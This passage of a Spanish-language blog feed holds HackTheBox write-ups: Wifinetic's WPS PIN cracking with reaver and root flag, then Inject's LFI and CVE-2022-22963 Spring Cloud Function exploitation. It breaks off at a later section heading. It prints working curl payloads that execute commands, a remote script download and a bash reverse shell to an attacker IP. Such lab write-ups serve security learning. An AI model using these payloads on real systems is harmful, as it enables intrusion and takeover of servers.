    <p>Como nos mencionan la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> cuando vimos las <code class="language-plaintext highlighter-rouge">capabilities</code> si investigamos la herramienta <code class="language-plaintext highlighter-rouge">reaver</code> pues es un <code class="language-plaintext highlighter-rouge">WPS cracker</code>.</p>
  </li>
  <li>
    <p>Aquí nos explican sobre el PIN <a href="https://outpost24.com/blog/wps-cracking-with-reaver/">https://outpost24.com/blog/wps-cracking-with-reaver/</a>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/wifinetic/5.png" />
</p>

<blockquote>
  <p>El PIN de WPS, generalmente de 8 dígitos, está impreso en el dispositivo para facilitar el acceso. Los primeros 7 dígitos son aleatorios y el último dígito es un dígito de verificación o checksum, calculado en base a los otros dígitos para detectar errores de entrada.</p>
</blockquote>

<blockquote>
  <p>Durante el proceso de autenticación, el sistema verifica el PIN en dos etapas. Primero, verifica los primeros cuatro dígitos del PIN. Si esta primera parte es correcta, procede a verificar los siguientes tres dígitos (el octavo es el dígito de checksum).</p>
</blockquote>

<ul>
  <li>Para eso usaremos <code class="language-plaintext highlighter-rouge">Reaver</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

Required Arguments:
	<span class="nt">-i</span>, <span class="nt">--interface</span><span class="o">=</span>&lt;wlan&gt;          Name of the monitor-mode interface to use
	<span class="nt">-b</span>, <span class="nt">--bssid</span><span class="o">=</span>&lt;mac&gt;               BSSID of the target AP

Optional Arguments:
	<span class="nt">-m</span>, <span class="nt">--mac</span><span class="o">=</span>&lt;mac&gt;                 MAC of the host system
	<span class="nt">-e</span>, <span class="nt">--essid</span><span class="o">=</span>&lt;ssid&gt;              ESSID of the target AP
	<span class="nt">-c</span>, <span class="nt">--channel</span><span class="o">=</span>&lt;channel&gt;         Set the 802.11 channel <span class="k">for </span>the interface <span class="o">(</span>implies <span class="nt">-f</span><span class="o">)</span>
	<span class="nt">-s</span>, <span class="nt">--session</span><span class="o">=</span>&lt;file&gt;            Restore a previous session file
	<span class="nt">-C</span>, <span class="nt">--exec</span><span class="o">=</span>&lt;<span class="nb">command</span><span class="o">&gt;</span>            Execute the supplied <span class="nb">command </span>upon successful pin recovery
	<span class="nt">-f</span>, <span class="nt">--fixed</span>                     Disable channel hopping
	<span class="nt">-5</span>, <span class="nt">--5ghz</span>                      Use 5GHz 802.11 channels
	<span class="nt">-v</span>, <span class="nt">--verbose</span>                   Display non-critical warnings <span class="o">(</span><span class="nt">-vv</span> or <span class="nt">-vvv</span> <span class="k">for </span>more<span class="o">)</span>
	<span class="nt">-q</span>, <span class="nt">--quiet</span>                     Only display critical messages
	<span class="nt">-h</span>, <span class="nt">--help</span>                      Show <span class="nb">help

</span>Advanced Options:
	<span class="nt">-p</span>, <span class="nt">--pin</span><span class="o">=</span>&lt;wps pin&gt;             Use the specified pin <span class="o">(</span>may be arbitrary string or 4/8 digit WPS pin<span class="o">)</span>
	<span class="nt">-d</span>, <span class="nt">--delay</span><span class="o">=</span>&lt;seconds&gt;           Set the delay between pin attempts <span class="o">[</span>1]
	<span class="nt">-l</span>, <span class="nt">--lock-delay</span><span class="o">=</span>&lt;seconds&gt;      Set the <span class="nb">time </span>to <span class="nb">wait </span><span class="k">if </span>the AP locks WPS pin attempts <span class="o">[</span>60]
	<span class="nt">-g</span>, <span class="nt">--max-attempts</span><span class="o">=</span>&lt;num&gt;        Quit after num pin attempts
	<span class="nt">-x</span>, <span class="nt">--fail-wait</span><span class="o">=</span>&lt;seconds&gt;       Set the <span class="nb">time </span>to <span class="nb">sleep </span>after 10 unexpected failures <span class="o">[</span>0]
	<span class="nt">-r</span>, <span class="nt">--recurring-delay</span><span class="o">=</span>&lt;x:y&gt;     Sleep <span class="k">for </span>y seconds every x pin attempts
	<span class="nt">-t</span>, <span class="nt">--timeout</span><span class="o">=</span>&lt;seconds&gt;         Set the receive <span class="nb">timeout </span>period <span class="o">[</span>10]
	<span class="nt">-T</span>, <span class="nt">--m57-timeout</span><span class="o">=</span>&lt;seconds&gt;     Set the M5/M7 <span class="nb">timeout </span>period <span class="o">[</span>0.40]
	<span class="nt">-A</span>, <span class="nt">--no-associate</span>              Do not associate with the AP <span class="o">(</span>association must be <span class="k">done </span>by another application<span class="o">)</span>
	<span class="nt">-N</span>, <span class="nt">--no-nacks</span>                  Do not send NACK messages when out of order packets are received
	<span class="nt">-S</span>, <span class="nt">--dh-small</span>                  Use small DH keys to improve crack speed
	<span class="nt">-L</span>, <span class="nt">--ignore-locks</span>              Ignore locked state reported by the target AP
	<span class="nt">-E</span>, <span class="nt">--eap-terminate</span>             Terminate each WPS session with an EAP FAIL packet
	<span class="nt">-J</span>, <span class="nt">--timeout-is-nack</span>           Treat <span class="nb">timeout </span>as NACK <span class="o">(</span>DIR-300/320<span class="o">)</span>
	<span class="nt">-F</span>, <span class="nt">--ignore-fcs</span>                Ignore frame checksum errors
	<span class="nt">-w</span>, <span class="nt">--win7</span>                      Mimic a Windows 7 registrar <span class="o">[</span>False]
	<span class="nt">-K</span>, <span class="nt">--pixie-dust</span>                Run pixiedust attack
	<span class="nt">-Z</span>                              Run pixiedust attack

Example:
	reaver <span class="nt">-i</span> wlan0mon <span class="nt">-b</span> 00:90:4C:C1:AC:21 <span class="nt">-vv</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Para usarla simplemente le necesitas proporcionar el nombre de la interfaz en modo monitor y la <code class="language-plaintext highlighter-rouge">MAC</code> del <code class="language-plaintext highlighter-rouge">target</code>.</p>
  </li>
  <li>
    <p>Vamos atacar el target donde se esta corriendo el <strong>AP</strong>.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>reaver <span class="nt">-i</span> mon0 <span class="nt">-b</span> 02:00:00:00:00:00 <span class="nt">-vv</span>

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright <span class="o">(</span>c<span class="o">)</span> 2011, Tactical Network Solutions, Craig Heffner &lt;cheffner@tacnetsol.com&gt;

<span class="o">[</span>+] Waiting <span class="k">for </span>beacon from 02:00:00:00:00:00
<span class="o">[</span>+] Switching mon0 to channel 1
<span class="o">[</span>+] Received beacon from 02:00:00:00:00:00
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[!]</span> Found packet with bad FCS, skipping...
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[!]</span> WPS transaction failed <span class="o">(</span>code: 0x04<span class="o">)</span>, re-trying last pin
<span class="o">[</span>+] Trying pin <span class="s2">"12345670"</span>
<span class="o">[</span>+] Sending authentication request
<span class="o">[</span>+] Sending association request
<span class="o">[</span>+] Associated with 02:00:00:00:00:00 <span class="o">(</span>ESSID: OpenWrt<span class="o">)</span>
<span class="o">[</span>+] Sending EAPOL START request
<span class="o">[</span>+] Received identity request
<span class="o">[</span>+] Sending identity response
<span class="o">[</span>+] Received M1 message
<span class="o">[</span>+] Sending M2 message
<span class="o">[</span>+] Received M3 message
<span class="o">[</span>+] Sending M4 message
<span class="o">[</span>+] Received M5 message
<span class="o">[</span>+] Sending M6 message
<span class="o">[</span>+] Received M7 message
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[</span>+] Sending WSC NACK
<span class="o">[</span>+] Pin cracked <span class="k">in </span>6 seconds
<span class="o">[</span>+] WPS PIN: <span class="s1">'12345670'</span>
<span class="o">[</span>+] WPA PSK: <span class="s1">'WhatIsRealAnDWhAtIsNot51121!'</span>
<span class="o">[</span>+] AP SSID: <span class="s1">'OpenWrt'</span>
<span class="o">[</span>+] Nothing <span class="k">done</span>, nothing to save.
</code></pre></div></div>

<ul>
  <li>Vemos que tenemos el <code class="language-plaintext highlighter-rouge">PIN</code> y la <code class="language-plaintext highlighter-rouge">Password</code>.</li>
</ul>

<h2 id="shell-as-root-and-roottxt">Shell as root and root.txt</h2>

<ul>
  <li>Si migramos al usuario <code class="language-plaintext highlighter-rouge">root</code> con la contraseña funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netadmin@wifinetic:/<span class="nv">$ </span>su root
Password:
root@wifinetic:/# <span class="nb">whoami
</span>root
root@wifinetic:/#
</code></pre></div></div>

<ul>
  <li>Vemos la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@wifinetic:~# <span class="nb">cat </span>root.txt
82e27401ce5bb1d85196562913c72da9
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Inject (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html" rel="alternate" type="text/html" title="HackTheBox - Inject (easy)" /><published>2024-06-02T00:00:00-06:00</published><updated>2024-06-02T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/02/inject.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/285ba8819710b6ae1f67bc0e5914ffd9.png" />
</p>

<ul>
  <li>Inject is an Easy Difficulty Linux machine featuring a website with file upload functionality vulnerable to Local File Inclusion (LFI). By exploiting the LFI vulnerability, files on the system can be enumerated, revealing that the web application uses a specific version of the <code class="language-plaintext highlighter-rouge">Spring-Cloud-Function-Web</code> module susceptible to <code class="language-plaintext highlighter-rouge">CVE-2022-22963</code>. Exploiting this vulnerability grants an initial foothold as the <code class="language-plaintext highlighter-rouge">frank</code> user. Lateral movement is achieved by further file enumeration, which discloses a plaintext password for <code class="language-plaintext highlighter-rouge">phil</code>. A cronjob running on the machine can then be exploited to execute a malicious <code class="language-plaintext highlighter-rouge">Ansible</code> playbook, ultimately obtaining a reverse shell as the <code class="language-plaintext highlighter-rouge">root</code> user.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
  <li>Comenzamos escaneando los puertos abiertos y sus servicios por el protocolo <strong>TCP</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap <span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,8080 10.10.11.204 <span class="nt">-oN</span> targeted
Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-06-02 11:53 CST
Nmap scan report <span class="k">for </span>10.10.11.204
Host is up <span class="o">(</span>0.084s latency<span class="o">)</span><span class="nb">.</span>

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 <span class="o">(</span>RSA<span class="o">)</span>
|   256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d <span class="o">(</span>ED25519<span class="o">)</span>
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<h2 id="enumeración-y-lfi">Enumeración y LFI</h2>

<ul>
  <li>Vemos las versiones que esta corriendo el servicio web que al parecer no son muchas.</li>
</ul>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="n">nmap</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span>
<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">:</span><span class="mi">8080</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Bootstrap</span><span class="p">,</span> <span class="no">Content</span><span class="o">-</span><span class="no">Language</span><span class="p">[</span><span class="n">en</span><span class="o">-</span><span class="no">US</span><span class="p">],</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">Frame</span><span class="p">,</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.204</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Home</span><span class="p">],</span> <span class="no">YouTube</span>
</code></pre></div></div>

<ul>
  <li>Esta es la pagina web.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/1.png" />
</p>

<ul>
  <li>En la parte de <strong>register</strong> no vemos nada importante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/2.png" />
</p>

<ul>
  <li>La parte de <strong>blogs</strong> funciona y vemos algunos usuarios.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/3.png" />
</p>

<ul>
  <li>Sin embargo hay una ruta que se llama <strong>/upload</strong> la cual esta si funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/4.png" />
</p>

<ul>
  <li>
    <p>Vamos a subir un archivo cualquiera en este caso un <code class="language-plaintext highlighter-rouge">.txt</code>.</p>
  </li>
  <li>
    <p>Sin embargo aunque lo subamos nos da esta respuesta.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/5.png" />
</p>

<ul>
  <li>Si probamos con una imagen funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/6.png" />
</p>

<ul>
  <li>Podemos ver la imagen y la <code class="language-plaintext highlighter-rouge">url</code> es interesante.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/7.png" />
</p>

<ul>
  <li>Vamos a capturar la petición con <code class="language-plaintext highlighter-rouge">burpsuite</code> al momento de abrir la imagen y si probamos un LFI vemos que funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/8.png" />
</p>

<ul>
  <li>Hay 2 usuarios.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/9.png" />
</p>

<ul>
  <li>Si vemos lo que hay dentro del directorio de <code class="language-plaintext highlighter-rouge">frank</code> encontramos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/10.png" />
</p>

<ul>
  <li>Aquí vemos una contraseña y un <code class="language-plaintext highlighter-rouge">.xml</code> con información.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/11.png" />
</p>

<blockquote>
  <p>La contraseña no funciona para conectarnos por SSH.</p>
</blockquote>

<blockquote>
  <p>El archivo de configuración que ha mostrado pertenece a Maven, que es una herramienta de gestión y comprensión de proyectos de software. Este archivo específico se usa para configurar ajustes relacionados con la construcción y gestión de proyectos en Maven By ChatGPT.</p>
</blockquote>

<ul>
  <li>Vemos que ya nos hablan de <code class="language-plaintext highlighter-rouge">Java</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/12.png" />
</p>

<ul>
  <li>Vemos un <code class="language-plaintext highlighter-rouge">WebApp</code> con archivos interesantes.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/13.png" />
</p>

<ul>
  <li>Si le decimos a <code class="language-plaintext highlighter-rouge">ChatGPT</code> a que corresponden esos archivos nos dice que pertenecen a Maven.</li>
</ul>

<blockquote>
  <p>La imagen que has proporcionado muestra una lista de archivos y directorios que son comunes en un proyecto de Java utilizando Maven como sistema de gestión y construcción de proyectos.</p>
</blockquote>

<h2 id="spring-cloud-function">Spring Cloud Function</h2>

<ul>
  <li>En el archivo <code class="language-plaintext highlighter-rouge">pom.xml</code> encontramos información incluye dependencias, propiedades del proyecto y configuraciones especificas de compilación.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/14.png" />
</p>

<ul>
  <li>Nos da la versión que se esta utilizando para la biblioteca <code class="language-plaintext highlighter-rouge">spring-cloud-function-web</code> con versión <code class="language-plaintext highlighter-rouge">3.2.2</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/15.png" />
</p>

<ul>
  <li>
    <p>Esta versión es vulnerable <a href="https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/">https://nsfocusglobal.com/spring-cloud-function-spel-expression-injection-vulnerability-alert/</a>.</p>
  </li>
  <li>
    <p>Aquí nos explican en que consiste y como se explota <a href="https://sysdig.com/blog/cve-2022-22963-spring-cloud/">https://sysdig.com/blog/cve-2022-22963-spring-cloud/</a>.</p>
  </li>
  <li>
    <p>Al parecer aprovecha de <code class="language-plaintext highlighter-rouge">Runtime.getRuntime().exec()</code> que es un método en Java para ejecutar comandos.</p>
  </li>
  <li>
    <p>Para ver si es vulnerable vamos hacer una petición con <code class="language-plaintext highlighter-rouge">curl</code>  a la ruta <code class="language-plaintext highlighter-rouge">functionRouter</code> lo que vamos hacer es crear un archivo en el directorio <code class="language-plaintext highlighter-rouge">/tmp</code>.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/17.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"touch /tmp/pwned"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 18:52:19 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:52:19.471+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>%                                   
</code></pre></div></div>

<ul>
  <li>Si comprobamos desde el <strong>LFI</strong> vemos que efectivamente se creo.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/easy/inject/16.png" />
</p>

<h2 id="shell-as-frank">Shell as frank</h2>

<ul>
  <li>Para obtener una <code class="language-plaintext highlighter-rouge">shell</code> vamos a crear un <code class="language-plaintext highlighter-rouge">.sh</code> que contenga una reverse <code class="language-plaintext highlighter-rouge">shell</code> y lo vamos a compartir mediante un servidor http con python3 para poder descargarlo en la maquina victima y hacer una petición al archivo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>reverse.php
<span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.14.55/443 0&gt;&amp;1
➜  content python3 <span class="nt">-m</span> http.server 80
Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</code></pre></div></div>

<ul>
  <li>Ahora nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
</code></pre></div></div>

<ul>
  <li>Ahora subimos el archivo a la máquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"curl http://10.10.14.55:80/reverse.sh -o /tmp/reverse.sh"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 18:58:15 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:58:15.168+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Ahora le damos permisos de ejecución.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("chmod +x /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"chmod +x /tmp/reverse.sh"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 18:59:10 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T18:59:10.711+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Y por ultimo lo ejecutamos para obtener <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content curl <span class="nt">-X</span> POST http://10.10.11.204:8080/functionRouter <span class="nt">-H</span> <span class="s1">'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/reverse.sh")'</span> <span class="nt">--data-raw</span> <span class="s1">'data'</span> <span class="nt">-v</span>
Note: Unnecessary use of <span class="nt">-X</span> or <span class="nt">--request</span>, POST is already inferred.
<span class="k">*</span>   Trying 10.10.11.204:8080...
<span class="k">*</span> Connected to 10.10.11.204 <span class="o">(</span>10.10.11.204<span class="o">)</span> port 8080
<span class="o">&gt;</span> POST /functionRouter HTTP/1.1
<span class="o">&gt;</span> Host: 10.10.11.204:8080
<span class="o">&gt;</span> User-Agent: curl/8.5.0
<span class="o">&gt;</span> Accept: <span class="k">*</span>/<span class="k">*</span>
<span class="o">&gt;</span> spring.cloud.function.routing-expression:T<span class="o">(</span>java.lang.Runtime<span class="o">)</span>.getRuntime<span class="o">()</span>.exec<span class="o">(</span><span class="s2">"bash /tmp/reverse.sh"</span><span class="o">)</span>
<span class="o">&gt;</span> Content-Length: 4
<span class="o">&gt;</span> Content-Type: application/x-www-form-urlencoded
<span class="o">&gt;</span>
&lt; HTTP/1.1 500
&lt; Content-Type: application/json
&lt; Transfer-Encoding: chunked
&lt; Date: Sun, 02 Jun 2024 19:00:11 GMT
&lt; Connection: close
&lt;
<span class="k">*</span> Closing connection
<span class="o">{</span><span class="s2">"timestamp"</span>:<span class="s2">"2024-06-02T19:00:11.233+00:00"</span>,<span class="s2">"status"</span>:500,<span class="s2">"error"</span>:<span class="s2">"Internal Server Error"</span>,<span class="s2">"message"</span>:<span class="s2">"EL1001E: Type conversion problem, cannot convert from java.lang.ProcessImpl to java.lang.String"</span>,<span class="s2">"path"</span>:<span class="s2">"/functionRouter"</span><span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la <code class="language-plaintext highlighter-rouge">shell</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.55] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.204] 42862
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>827<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
frank@inject:/<span class="nv">$ </span><span class="nb">whoami
whoami
</span>frank
frank@inject:/<span class="err">$</span>
</code></pre></div></div>

<h2 id="shell-as-phil">Shell as phil</h2>

<ul>
